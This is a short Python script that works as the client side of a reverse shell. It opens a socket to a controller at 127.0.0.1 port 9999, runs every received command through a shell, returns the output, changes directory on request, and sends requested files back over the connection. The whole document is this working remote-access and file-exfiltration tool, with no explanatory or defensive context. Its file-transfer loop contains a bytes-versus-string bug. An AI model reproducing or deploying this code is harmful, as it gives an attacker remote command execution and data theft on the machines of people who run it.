import os
import socket
import subprocess

def transfer(s,path):
    if os.path.exists(path):
        f=open(path,'rb')
        packet=f.read(1024)
        while packet != '':
            s.send(packet)
            packet=f.read(1024)
        f.close()        
    else:
        s.send('Unable to find out the file'.encode())
        
s = socket.socket()
host = "127.0.0.1"
port = 9999
s.connect((host,port))

while True:
    data = s.recv(1024)
    
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))
        
    if 'download' in data.decode("utf-8"):
        grab,path=data.decode("utf-8").split()
        try:
            transfer(s,path)
        except Exception as e:
            s.send(str(e))
            
    if len(data)>0:
        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_bytes,"utf-8")
        s.send(str.encode(output_str + str(os.getcwd())+'>'))
        print(output_str)        
#Close connection
s.close()
